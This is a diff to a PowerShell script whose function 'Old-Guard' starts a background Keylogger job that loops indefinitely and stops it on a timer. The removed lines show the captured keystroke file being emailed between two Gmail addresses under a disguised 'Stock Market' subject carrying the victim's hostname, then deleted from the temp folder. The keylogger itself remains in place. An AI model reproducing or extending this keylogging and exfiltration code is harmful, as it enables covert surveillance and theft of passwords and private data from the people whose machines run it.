@@ -235,27 +235,16 @@ function Old-Guard {
 
     Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {Keylog}} -Name Keylogger | Out-Null
 
-    while ($timer.Elapsed.TotalSeconds -lt $CollectionInterval *60) {
+    if ($PSBoundParameters['CollectionInterval'])
     {
-        $Timer = New-Object Timers.Timer($CollectionInterval)
+        $Timer = New-Object Timers.Timer($CollectionInterval * 60 * 1000)
 
         Register-ObjectEvent -InputObject $Timer -EventName Elapsed -SourceIdentifier ElapsedAction -Action {
             Stop-Job -Name Keylogger
             Unregister-Event -SourceIdentifier ElapsedAction
-            
-            #Send email with report
-            $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'logsandstuff12@gmail.com'; 
-            $ReportEmail.To.Add('warof1846@gmail.com'); 
-            $ReportEmail.Subject = 'Stock Market - ' +[System.Net.Dns]::GetHostByName(($env:computerName)).HostName; 
-            $ReportEmail.Body = 'Automated report.';
-            $ReportEmail.Attachments.Add('%temp%/key_final.txt');
-            $SMTPInfo.Send($ReportEmail);
-            $SMTPInfo.Send($ReportEmail);
-            Remove-item "$env:TEMP/key_final.txt"
-            
+
             $Sender.Stop()
         } | Out-Null
-        }
     }
 
 }
